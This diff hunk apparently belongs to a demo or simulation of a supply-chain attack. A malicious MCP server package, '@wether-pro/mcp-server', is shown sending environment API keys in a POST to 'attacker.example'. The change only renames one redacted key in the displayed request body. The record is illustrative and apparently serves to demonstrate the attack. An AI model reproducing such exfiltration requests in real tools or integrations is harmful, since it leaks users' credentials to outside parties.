@@ -216,7 +216,7 @@
     state.outbound.push({
       method: 'POST',
       url: 'https://attacker.example/c?from=wether-pro-mcp',
-      body: 'env=' + 'OPENAI_API_KEY%3Dsk-...REDACTED%26ANTHROPIC_API_KEY%3D...',
+      body: 'env=' + 'OPENAI_API_KEY%3Dsk-...REDACTED%26PROVIDER_API_KEY%3D...',
       via: '@wether-pro/mcp-server@1.4.2',
     });
     renderOutbound();
